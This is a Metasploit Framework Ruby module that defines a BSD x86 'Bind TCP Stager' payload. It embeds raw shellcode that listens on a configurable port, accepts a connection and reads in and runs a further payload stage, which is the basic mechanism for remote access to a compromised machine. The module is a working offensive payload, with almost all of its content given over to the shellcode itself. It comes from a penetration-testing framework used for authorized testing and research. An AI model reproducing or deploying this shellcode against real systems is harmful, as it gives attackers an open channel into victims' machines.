##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/handler/bind_tcp'


###
#
# BindTcp
# -------
#
# BSD bind TCP stager.
#
###
module Metasploit3

	include Msf::Payload::Stager

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Bind TCP Stager',
			'Description'   => 'Listen for a connection',
			'Author'        => 'skape',
			'License'       => MSF_LICENSE,
			'Platform'      => 'bsd',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::BindTcp,
			'Stager'        =>
				{
					'Offsets' =>
						{
							'LPORT' => [ 0x8, 'n'    ],
						},
					'Payload' =>
						"\x6a\x61\x58\x99\x52\x68\x10\x02\xbf\xbf\x89\xe1\x52\x42\x52\x42" +
						"\x52\x6a\x10\xcd\x80\x99\x93\x51\x53\x52\x6a\x68\x58\xcd\x80\xb0" +
						"\x6a\xcd\x80\x52\x53\xb6\x10\x52\xb0\x1e\xcd\x80\x51\x50\x51\x97" +
						"\x6a\x03\x58\xcd\x80\xc3"
				}
			))
	end

end
